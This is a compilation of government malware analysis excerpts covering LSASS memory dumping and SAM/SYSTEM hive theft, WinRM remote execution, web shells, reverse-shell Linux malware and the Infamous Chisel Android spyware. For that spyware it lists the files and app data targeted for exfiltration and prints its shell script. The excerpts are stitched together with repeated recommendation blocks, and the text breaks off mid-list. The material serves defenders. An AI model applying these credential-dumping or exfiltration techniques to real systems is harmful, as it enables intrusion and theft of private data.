&lt;p&gt;This file is a Windows batch file called a.bat that is used to execute the file called a.exe with the file called a.dll as an argument. The output is printed to a file named 'z.txt' located in the path C:\Windows\Tasks. Next, a.bat pings the loop back internet protocol (IP) address 127.0.0[.]1 three times.&lt;br /&gt;&lt;br /&gt;The next command it runs is reg save to save the HKLM\SYSTEM registry hive into the C:\Windows\tasks\em directory. Again, a.bat pings the loop back address 127.0.0[.]1 one time before executing another reg save command and saves the HKLM\SAM registry hive into the C:\Windows\Task\am directory. Next, a.bat runs three makecab commands to create three Cabinet (.cab) files from the previously mentioned saved registry hives and one file named C:\Users\Public\a.png. The names of the .cab files are as follows:&lt;br /&gt;&lt;br /&gt;--Start names and paths of .cab files created--&lt;br /&gt;c:\windows\tasks\em.cab&lt;br /&gt;c:\windows\tasks\am.cab&lt;br /&gt;c:\windows\tasks\a.cab&lt;br /&gt;--End names and paths of .cab files created--&lt;/p&gt;

&lt;h5&gt;Description&lt;/h5&gt;
&lt;p&gt;This file is a 64-bit Windows command-line executable called a.exe that is executed by a.bat. This file issues the Remote Procedure Call (RPC) ncalrpc:[lsasspirpc] to the RPC end point to provide a file path to the LSASS on the infected machine. Once the file path is returned, the malware loads the accompanying DLL file called a.dll into the running LSASS process. If the DLL is correctly loaded, then the malware outputs the message "[*]success" in the console.&lt;/p&gt;

&lt;h5&gt;Description&lt;/h5&gt;
&lt;p&gt;This file is a 64-bit Windows DLL called a.dll that is executed by a.bat as a parameter for the file a.exe. The file a.exe loads this file into the running LSASS process on the infected machine. The file a.dll calls the Windows API CreateFileW to create a file called a.png in the path C:\Users\Public.&lt;br /&gt;&lt;br /&gt;Next, a.dll loads DbgCore.dll then utilizes MiniDumpWriteDump function to dump LSASS process memory to disk. If successful, the dumped process memory is written to a.png. Once this is complete, the file a.bat specifies that the file a.png is used to create the cabinet file called a.cab in the path C:\Windows\Tasks.&lt;/p&gt;

&lt;h5&gt;Description&lt;/h5&gt;
&lt;p&gt;This file is a Python script called a.py that attempts to leverage WinRM to establish a session. The script attempts to authenticate to the remote machine using NT LAN Manager (NTLM) if the keyword "hashpasswd" is present. If the keyword "hashpasswd" is not present, then the script attempts to authenticate using basic authentication. Once a WinRM session is established with the remote machine, the script has the ability to execute command line arguments on the remote machine. If there is no command specified, then a default command of “whoami” is run.&lt;/p&gt;

&lt;h3&gt;Recommendations&lt;/h3&gt;
&lt;p&gt;CISA recommends that users and administrators consider using the following best practices to strengthen the security posture of their organization's systems. Any configuration changes should be reviewed by system owners and administrators prior to implementation to avoid unwanted impacts.&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Maintain up-to-date antivirus signatures and engines.&lt;/li&gt;
&lt;li&gt;Keep operating system patches up-to-date.&lt;/li&gt;
&lt;li&gt;Disable File and Printer sharing services. If these services are required, use strong passwords or Active Directory authentication.&lt;/li&gt;
&lt;li&gt;Restrict users' ability (permissions) to install and run unwanted software applications. Do not add users to the local administrators group unless required.&lt;/li&gt;
&lt;li&gt;Enforce a strong password policy and implement regular password changes.&lt;/li&gt;
&lt;li&gt;Exercise caution when opening e-mail attachments even if the attachment is expected and the sender appears to be known.&lt;/li&gt;
&lt;li&gt;Enable a personal firewall on agency workstations, configured to deny unsolicited connection requests.&lt;/li&gt;
&lt;li&gt;Disable unnecessary services on agency workstations and servers.&lt;/li&gt;
&lt;li&gt;Scan for and remove suspicious e-mail attachments; ensure the scanned attachment is its "true file type" (i.e., the extension matches the file header).&lt;/li&gt;
&lt;li&gt;Monitor users' web browsing habits; restrict access to sites with unfavorable content.&lt;/li&gt;
&lt;li&gt;Exercise caution when using removable media (e.g., USB thumb drives, external drives, CDs, etc.).&lt;/li&gt;
&lt;li&gt;Scan all software downloaded from the Internet prior to executing.&lt;/li&gt;
&lt;li&gt;Maintain situational awareness of the latest threats and implement appropriate Access Control Lists (ACLs).&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;Additional information on malware incident prevention and handling can be found in National Institute of Standards and Technology (NIST) Special Publication 800-83, &lt;strong&gt;"Guide to Malware Incident Prevention &amp;amp; Handling for Desktops and Laptops".&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;This file is a SUBMARINE artifact, an empty text/data file. The name of the file is designed to exploit a vulnerability on the target environment where the base64 string within the file name will be executed on the Linux shell. The code in Figure 1 will change the permissions of any directory/file/path with that begins with '/root/mac' to executable. Then, anything containing the string 'mach*' in the directory/file/path '/root/mach' are executed.&lt;/p&gt;

&lt;h5&gt;Description&lt;/h5&gt;
&lt;p&gt;This artifact, belonging to the SKIPJACK malware family, is a Perl script that enumerates file system information. This script first checks the file system by opening '/etc/fstab.main/,' then checks the value against the array 'ARGV[0]', which perl automatically provides to hold all values from the command line in. The script will print either 'xfs' or hda depending on the type of file system it finds. The script contains a second if statement that gathers more information about the type of file system. This second if statement contains the regular expression '/^\/dev\/(\S+)\d+\s+\/\s+(\S+)/,' which translates to '/etc/fstab.' The script uses this second half of the code to check for file system type or information about the partition, which it then prints based on the value of '$requested_data.'&lt;/p&gt;

&lt;h5&gt;Description&lt;/h5&gt;
&lt;p&gt;This artifact is a trojanized Lua module that has been identified as a "SEASPRAY" variant. SEASPRAY registers an event handler for all incoming email attachments. This variant checks for the sender and the string “obt”, which is hard coded in the lua file. If that string is found the malware uses os.execute to execute the file “saslautchd”, see Figure 3.&lt;/p&gt;

&lt;h5&gt;Description&lt;/h5&gt;
&lt;p&gt;This artifact, belonging to the WHIRLPOOL malware family, is a 64-bit Linux Executable and Linkable Format (ELF) file. The malware checks processor hardware and architecture, to include if the target system uses AMD or Intel, see Figure 4. Figure 5 shows the malware determining the kernel version by invoking the 'uname' command line function and exploring the contents of the '/proc/sys/kernel/osrelease' file. Figures 6, 7, and 8 show the malware's capacity to connect to a remote address, and then create a new process with the command line argument '/bin/sh.' The connection to a remote host and the invocation of a bash shell are the two components/phases used by reverse shells. Figure 9 shows the malware's capacity to interact with the Name Service Cache Daemon by creating and connecting to a Unix socket at ./var/run/nscd/socket.' This socket can cache Domain Name System (DNS) requests. Rather than listening on port 53, it listens on the socket file itself, for data from other programs/processes. Figure 10 shows the malware's capacity to perform DNS resolution, using the system call 'sys_getpeername.' The malware accesses the target's environment variables.

&lt;h5&gt;Description&lt;/h5&gt;
&lt;p&gt;This artifact, belonging to the SALTWATER malware family, is a 32-bit Linux Shared Object (.so) file. The malware can intake data over the network, using a previously established socket, with the 'recv' function as shown in Figure 11. Figure 12 shows the malware creating a new thread, within the calling process. This is thread injection and it can inject two different functions. Figure 13 shows the first function that can perform DNS resolution. Figures 14 and 15 show the second function. The second function can establish communications, over the network, using a TLS version 1 connection. Lastly, using 'popen', the malware can execute any shell command with the same privileges as its calling process.&lt;/p&gt;

&lt;h3&gt;Recommendations&lt;/h3&gt;
&lt;div class="cma-section"&gt;
&lt;p&gt;CISA recommends that users and administrators consider using the following best practices to strengthen the security posture of their organization's systems. Any configuration changes should be reviewed by system owners and administrators prior to implementation to avoid unwanted impacts.&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Maintain up-to-date antivirus signatures and engines.&lt;/li&gt;
&lt;li&gt;Keep operating system patches up-to-date.&lt;/li&gt;
&lt;li&gt;Disable File and Printer sharing services. If these services are required, use strong passwords or Active Directory authentication.&lt;/li&gt;
&lt;li&gt;Restrict users' ability (permissions) to install and run unwanted software applications. Do not add users to the local administrators group unless required.&lt;/li&gt;
&lt;li&gt;Enforce a strong password policy and implement regular password changes.&lt;/li&gt;
&lt;li&gt;Exercise caution when opening e-mail attachments even if the attachment is expected and the sender appears to be known.&lt;/li&gt;
&lt;li&gt;Enable a personal firewall on agency workstations, configured to deny unsolicited connection requests.&lt;/li&gt;
&lt;li&gt;Disable unnecessary services on agency workstations and servers.&lt;/li&gt;
&lt;li&gt;Scan for and remove suspicious e-mail attachments; ensure the scanned attachment is its "true file type" (i.e., the extension matches the file header).&lt;/li&gt;
&lt;li&gt;Monitor users' web browsing habits; restrict access to sites with unfavorable content.&lt;/li&gt;
&lt;li&gt;Exercise caution when using removable media (e.g., USB thumb drives, external drives, CDs, etc.).&lt;/li&gt;
&lt;li&gt;Scan all software downloaded from the Internet prior to executing.&lt;/li&gt;
&lt;li&gt;Maintain situational awareness of the latest threats and implement appropriate Access Control Lists (ACLs).&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;Additional information on malware incident prevention and handling can be found in National Institute of Standards and Technology (NIST) Special Publication 800-83, &lt;strong&gt;"Guide to Malware Incident Prevention &amp;amp; Handling for Desktops and Laptops".&lt;/strong&gt;&lt;/p&gt;

&lt;h3&gt;Summary&lt;/h3&gt;
&lt;h5&gt;Description&lt;/h5&gt;
&lt;p&gt;CISA received 4 files for analysis from an incident response engagement conducted at an Aeronautical Sector organization.&lt;br /&gt;&lt;br /&gt;2 files (bitmap.exe, wkHPd.exe) are identified as variants of Metasploit (Meterpreter) and designed to connect and receive unencrypted payloads from their respective command and control (C2) servers. Note: Metasploit is an open source penetration testing software; Meterpreter is a Metasploit attack payload that runs an interactive shell. These executables are used as attack payloads to run interactive shells, allowing a malicious actor the ability to control and execute code on a system.&lt;br /&gt;&lt;br /&gt;2 files (resource.aspx, ConfigLogin.aspx) are Active Server Pages (ASPX) web shells designed to execute remote JavaScript code on the victim server.&lt;br /&gt;&lt;br /&gt;CISA has provided indicators of compromise (IOCs) and YARA rules for detection within this Malware Analysis Report (MAR).&lt;br /&gt;&lt;br /&gt;For more information about this compromise, see Joint Cybersecurity Advisory &lt;a href="https://www.cisa.gov/news-events/cybersecurity-advisories/aa23-250a" title="Multiple Nation-State Threat Actors Exploit CVE-2022-47966 and CVE-2022-42475"&gt;Multiple Nation-State Threat Actors Exploit CVE-2022-47966 and CVE-2022-42475&lt;/a&gt;.&lt;/p&gt;

&lt;h3&gt;Recommendations&lt;/h3&gt;
&lt;p&gt;CISA recommends that users and administrators consider using the following best practices to strengthen the security posture of their organization's systems. Any configuration changes should be reviewed by system owners and administrators prior to implementation to avoid unwanted impacts.&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Maintain up-to-date antivirus signatures and engines.&lt;/li&gt;
&lt;li&gt;Keep operating system patches up-to-date.&lt;/li&gt;
&lt;li&gt;Disable File and Printer sharing services. If these services are required, use strong passwords or Active Directory authentication.&lt;/li&gt;
&lt;li&gt;Restrict users' ability (permissions) to install and run unwanted software applications. Do not add users to the local administrators group unless required.&lt;/li&gt;
&lt;li&gt;Enforce a strong password policy and implement regular password changes.&lt;/li&gt;
&lt;li&gt;Exercise caution when opening e-mail attachments even if the attachment is expected and the sender appears to be known.&lt;/li&gt;
&lt;li&gt;Enable a personal firewall on agency workstations, configured to deny unsolicited connection requests.&lt;/li&gt;
&lt;li&gt;Disable unnecessary services on agency workstations and servers.&lt;/li&gt;
&lt;li&gt;Scan for and remove suspicious e-mail attachments; ensure the scanned attachment is its "true file type" (i.e., the extension matches the file header).&lt;/li&gt;
&lt;li&gt;Monitor users' web browsing habits; restrict access to sites with unfavorable content.&lt;/li&gt;
&lt;li&gt;Exercise caution when using removable media (e.g., USB thumb drives, external drives, CDs, etc.).&lt;/li&gt;
&lt;li&gt;Scan all software downloaded from the Internet prior to executing.&lt;/li&gt;
&lt;li&gt;Maintain situational awareness of the latest threats and implement appropriate Access Control Lists (ACLs).&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;Additional information on malware incident prevention and handling can be found in National Institute of Standards and Technology (NIST) Special Publication 800-83, &lt;strong&gt;"Guide to Malware Incident Prevention &amp;amp; Handling for Desktops and Laptops".&lt;/strong&gt;&lt;/p&gt;

&lt;div&gt;
&lt;h2&gt;Executive Summary&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;Infamous Chisel is a collection of components targeting Android devices.&lt;/li&gt;
&lt;li&gt;This malware is associated with Sandworm activity.&lt;/li&gt;
&lt;li&gt;It performs periodic scanning of files and network information for exfiltration.&lt;/li&gt;
&lt;li&gt;System and application configuration files are exfiltrated from an infected device.&lt;/li&gt;
&lt;li&gt;Infamous Chisel provides network backdoor access via a Tor (The Onion Router) hidden service and Secure Shell (SSH).&lt;/li&gt;
&lt;li&gt;Other capabilities include network monitoring, traffic collection, SSH access, network scanning, and SCP file transfer.&lt;/li&gt;
&lt;/ul&gt;
&lt;h2&gt;Overview&lt;/h2&gt;
&lt;p&gt;The UK National Cyber Security Centre (NCSC), the U.S. National Security Agency (NSA), U.S. Cybersecurity and Infrastructure Security Agency (CISA), U.S. Federal Bureau of Investigation (FBI), New Zealand’s National Cyber Security Centre (NCSC-NZ), the Canadian Centre for Cyber Security – part of the Canada’s Communications Security Establishment (CSE), and Australian Signals Directorate (ASD) are aware that the actor known as Sandworm has used a new mobile malware in a campaign targeting Android devices used by the Ukrainian military. The malware is referred to here as Infamous Chisel.&lt;/p&gt;
&lt;p&gt;Organizations from the United Kingdom, United States, Australia, Canada, and New Zealand have previously linked the Sandworm actor to the Russian GRU's Main Centre for Special Technologies GTsST.&lt;/p&gt;

&lt;h2&gt;Malware Summary&lt;/h2&gt;
&lt;p&gt;Infamous Chisel is a collection of components which enable persistent access to an infected Android device over the Tor network, and which periodically collates and exfiltrates victim information from compromised devices. The information exfiltrated is a combination of system device information, commercial application information, and applications specific to the Ukrainian military.&lt;/p&gt;
&lt;p&gt;The malware periodically scans the device for information and files of interest, matching a predefined set of file extensions. It also contains functionality to periodically scan the local network collating information about active hosts, open ports, and banners.&lt;/p&gt;
&lt;p&gt;Infamous Chisel also provides remote access by configuring and executing Tor with a hidden service which forwards to a modified Dropbear binary providing a SSH connection.&lt;/p&gt;
&lt;p&gt;Other capability includes network monitoring and traffic collection, SSH access, network scanning, and SCP file transfer.&lt;/p&gt;

For &lt;code&gt;netd&lt;/code&gt;, &lt;code&gt;killer&lt;/code&gt;, &lt;code&gt;blob&lt;/code&gt;, and &lt;code&gt;td&lt;/code&gt; functionality can be extrapolated from references between them. The function of other binaries changes depending on the command line parameters that are supplied. It is likely that interaction takes place over the SSH remote shell connection configured by &lt;code&gt;netd&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;&lt;code&gt;netd&lt;/code&gt; is designed to persist on the system by replacing the legitimate &lt;code&gt;netd&lt;/code&gt; system binary at the path &lt;code&gt;/system/bin/netd&lt;/code&gt;. This replacement is not carried out by the malware, but it can be extrapolated from the checks that it carries out. This is the only Infamous Chisel component which persists.&lt;/p&gt;
&lt;p&gt;When the malicious &lt;code&gt;netd&lt;/code&gt; is executed, it will check if &lt;code&gt;init&lt;/code&gt; is the parent process which executed it. This parent process is responsible for creating the processes listed in the script &lt;code&gt;init.rc&lt;/code&gt;. The malicious replacement netd when executed in this way will fork and execute the legitimate process backed up at the path&amp;nbsp;&lt;code&gt;/system/bin/netd_&lt;/code&gt;&amp;nbsp;passing through the command line parameters. This retains the normal functionality of &lt;code&gt;netd&lt;/code&gt;, while allowing the malicious &lt;code&gt;netd&lt;/code&gt; to execute as root. This replacement would require an escalated privilege level to perform.&lt;/p&gt;
&lt;p&gt;If it doesn’t find itself at the &lt;code&gt;/system/bin/netd&lt;/code&gt; path, it will fork and set its parent process ID to &lt;code&gt;1&lt;/code&gt;, also attempting to kill the legitimate &lt;code&gt;netd&lt;/code&gt; process.&lt;/p&gt;
&lt;div&gt;
&lt;h2&gt;Components&lt;/h2&gt;
&lt;h3&gt;netd&lt;/h3&gt;
&lt;p&gt;The &lt;code&gt;netd&lt;/code&gt; component of Infamous Chisel provides the bulk of the custom functionality which the actor deploys. The main purpose of &lt;code&gt;netd&lt;/code&gt; is to collate and exfiltrate information from the compromised device at set intervals. It uses a combination of shell scripts and commands to collect device information. It also searches multiple directories to which files matching a predefined set of extensions are exfiltrated.&lt;/p&gt;
&lt;h4&gt;Exfiltration Logic&lt;/h4&gt;
&lt;/div&gt;
&lt;/div&gt;
&lt;p&gt;All file exfiltration is performed as detailed in the Communications (File exfiltration)&amp;nbsp;Section of this report. Whenever a file is selected for exfiltration, it is MD5-hashed and cross-referenced with a list of previously sent file hashes held in a file at one of three locations supporting different Android versions. The first existing directory path will be used:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;/sdcard/Android/data/.google.index&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;/storage/emulated/0/Android/data/.google.index&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;/storage/emulated/1/Android/data/.google.index&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;The file exfiltration is considered complete when the server sends &lt;code&gt;Success&lt;/code&gt; anywhere in its response. As this exfiltration uses a Hypertext Transfer Protocol (HTTP) POST, this server response is also expected to be HTTP, but this is not explicitly checked for.&lt;/p&gt;
&lt;p&gt;The 16 raw bytes of the MD5 are appended to the end of the &lt;code&gt;.google.index file&lt;/code&gt;, ensuring that the same file isn’t sent multiple times. As the &lt;code&gt;.google.index&lt;/code&gt; file contains raw bytes, without prior knowledge, it would appear to contain random data. The initial allocation size is 256 Kb filled with NULLs providing space for up to a maximum of 16,384 file hashes. All hash entries will be checked for every file prior to exfiltration.&lt;/p&gt;
&lt;p&gt;When the end of the &lt;code&gt;.google.index&lt;/code&gt; file is reached, the position is reset to the start, overwriting the previous hashes. This means if the number of files to exfiltrate from the device exceeds 16,384, files will be sent multiple times.&lt;/p&gt;
&lt;h4&gt;Information Gathering&lt;/h4&gt;
&lt;p&gt;On execution, the Infamous Chisel &lt;code&gt;netd&lt;/code&gt; component enters a main loop that executes indefinitely where various timers trigger the execution of different tasks. All timer actions are executed immediately on first execution, and then at the specific intervals.&lt;/p&gt;
&lt;h5&gt;File and Device Information Exfiltration&lt;/h5&gt;
&lt;p&gt;Every 86,000 seconds (23 hours, 53 minutes, and 20 seconds) the following actions are performed:&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;1. File exfiltration from data directories&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;The following directories are recursively searched for files matching the extensions listed. When a file is found by this search, it is exfiltrated as detailed in the Communications (File exfiltration) Section of this report.&lt;/p&gt;
&lt;p&gt;File extension list:&lt;/p&gt;
&lt;table&gt;
&lt;tbody&gt;
&lt;tr&gt;
&lt;td&gt;.dat, .bak, .xml, .txt, .ovpn, .xml, wa.db, msgstore.db, .pdf, .xlsx, .csv, .zip, telephony.db, .png, .jpg, .jpeg, .kme, database.hik, database.hik-journal, ezvizlog.db, cache4.db, contacts2.db, .ocx, .gz, .rar, .tar, .7zip, .zip, .kmz, locksettings.db, mmssms.db, telephony.db, signal.db, mmssms.db, profile.db, accounts.db, PyroMsg.DB, .exe, .kml&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;
&lt;/table&gt;
&lt;p&gt;Directory list:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;/sdcard&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;/storage/emulated/0/&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;/data/media&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;/data/data/de.blinkt.openvpn&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;/data/data/org.thoughtcrime.securesms&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;/data/data/net.openvpn.openvpn&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;/data/data/org.telegram.messenger&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;/data/data/vpn.fastvpn.freevpn&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;/data/data/eu.thedarken.wldonate&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;/data/data/com.android.providers.contacts&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;/data/data/com.android.providers.telephony&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;/data/data/com.google.android.gm&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;/data/system/users/0/&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;Along with other military specific application directories.&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;2. Information collection script&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;An information collection script collates various hardware configuration information about the device.&lt;/p&gt;
&lt;p&gt;The script is written to the location: &lt;code&gt;/data/local/tmp/.android.cache.sh&lt;/code&gt; and then executed by &lt;code&gt;netd&lt;/code&gt; using the command &lt;code&gt;/system/bin/sh -c /data/local/tmp/.android.cache.sh&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;&lt;code&gt;.android.cache.sh&lt;/code&gt; contains the following shell script:&lt;/p&gt;
&lt;table&gt;
&lt;tbody&gt;
&lt;tr&gt;
&lt;td&gt;
&lt;p&gt;#!/system/bin/sh&lt;/p&gt;
&lt;p&gt;system/bin/&lt;a&gt;settings get secure android_id&lt;/a&gt; &amp;gt; /data/local/tmp/.aid.cache&lt;/p&gt;
&lt;p&gt;system/bin/ip a &amp;gt; /data/local/tmp/.syscache.csv&lt;/p&gt;
&lt;p&gt;system/bin/pm list packages &amp;gt; /data/local/tmp/.syspackages.csv&lt;/p&gt;
&lt;p&gt;system/bin/getprop &amp;gt; /data/local/tmp/&lt;a&gt;.sysinfo.csv&lt;/a&gt;&lt;/p&gt;
&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;
&lt;/table&gt;
&lt;table class="tablesaw tablesaw-stack"&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;td&gt;
&lt;p&gt;&lt;strong&gt;Command&lt;/strong&gt;&lt;/p&gt;
&lt;/td&gt;
&lt;td&gt;
&lt;p&gt;&lt;strong&gt;Description&lt;/strong&gt;&lt;/p&gt;
&lt;/td&gt;
&lt;td&gt;
&lt;p&gt;&lt;strong&gt;Output filename&lt;/strong&gt;&lt;/p&gt;
&lt;/td&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;
&lt;tr&gt;
&lt;td&gt;
&lt;p&gt;settings get secure android_id&lt;/p&gt;
&lt;/td&gt;
&lt;td&gt;
&lt;p&gt;Returns a hexadecimal string identifying the device uniquely.&lt;/p&gt;
&lt;/td&gt;
&lt;td&gt;
&lt;p&gt;.aid.cache&lt;/p&gt;
&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;
&lt;p&gt;ip a&lt;/p&gt;
&lt;/td&gt;
&lt;td&gt;
&lt;p&gt;Lists networking information such as IP address, subnet and interface type on a per network interface basis.&lt;/p&gt;
&lt;/td&gt;
&lt;td&gt;
&lt;p&gt;.syscache.csv&lt;/p&gt;
&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;
&lt;p&gt;pm list packages&lt;/p&gt;
&lt;/td&gt;
&lt;td&gt;
&lt;p&gt;List of installed applications on the device.&lt;/p&gt;
&lt;/td&gt;
&lt;td&gt;
&lt;p&gt;.syspackages.csv&lt;/p&gt;
&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;
&lt;p&gt;getprop&lt;/p&gt;
&lt;/td&gt;
&lt;td&gt;
&lt;p&gt;Lists various device hardware information such as GPS, battery, manufacturer and language.&lt;/p&gt;
&lt;/td&gt;
&lt;td&gt;
&lt;p&gt;.sysinfo.csv&lt;/p&gt;
&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;
&lt;/table&gt;
&lt;p&gt;All the information is written to the various files in the &lt;code&gt;/data/local&lt;/code&gt; directory and exfiltrated, with the exception of the &lt;code&gt;.aid.cache&lt;/code&gt; file. The &lt;code&gt;android_id&lt;/code&gt; contained within this file is used to form part of the Uniform Resource Identifier (URI) detailed in the Communications&amp;nbsp;Section of this report.&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;3. File exfiltration from application directories&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;The &lt;code&gt;/data/&lt;/code&gt; directory is searched for the application directories:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;com.google.android.apps.authenticator2&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;net.openvpn.openvpn&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;free.vpn.unblock.proxy.vpnmaster&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;com.UCMobile.intl&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;com.brave.browser&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;com.opera.browser&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;com.hisense.odinbrowser&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;com.dzura&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;com.google.android.apps.docs&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;com.sec.android.app.myfiles&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;com.microsoft.skydrive&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;com.google.android.apps.walletnfcrel&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;com.paypal.android.p2pmobile&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;com.binance.dev&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;com.coinbase.android&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;com.wallet.crypto.trustapp&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;com.viber.voip&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;com.dropbox.android&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;com.android.providers.telephony&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;com.android.providers.contacts&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;com.cxinventor.file.explorer&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;com.elinke.fileserver&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;org.mozilla.firefox&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;com.whatsapp&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;org.thoughtcrime.securesms&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;org.telegram.messenger&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;org.telegram.messenger.web&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;com.discord&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;com.hikvisionsystems.app&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;com.hikvision.hikconnect&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;com.skype.raider&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;com.google.android.gm&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;com.android.chrome&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;org.chromium.webview_shell&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;keystore&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;Along with some military application specific directories.&lt;/p&gt;
&lt;p&gt;Every file in these directories regardless of type is exfiltrated.&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;4. Specific file exfiltration&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;The following files at the absolute paths are exfiltrated:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;/data/local/tmp/.syscache.csv&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;/data/local/tmp/.syspackages.csv&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;/data/local/tmp/.sysinfo.csv&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;/data/system/users/0/settings_ssaid.xml&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;Along with some military application specific directories.&lt;/p&gt;
&lt;p&gt;The files with the extension &lt;code&gt;.csv&lt;/code&gt; are generated by the malware. The others are application specific files or system configuration information.&lt;/p&gt;
&lt;h5&gt;Exfiltration of Configuration and Configuration Backup Files&lt;/h5&gt;
&lt;p&gt;Every 600 seconds (10 minutes) the following directories are searched for files of type &lt;code&gt;.json&lt;/code&gt; or &lt;code&gt;.json.bak&lt;/code&gt; which are then immediately exfiltrated:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;/sdcard&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;/storage/emulated/0/&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;/data/media&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;/data/data/de.blinkt.openvpn&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;/data/data/org.thoughtcrime.securesms&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;/data/data/net.openvpn.openvpn&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;/data/data/org.telegram.messenger&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;/data/data/vpn.fastvpn.freevpn&lt;/code&gt;&lt;/li&gt;
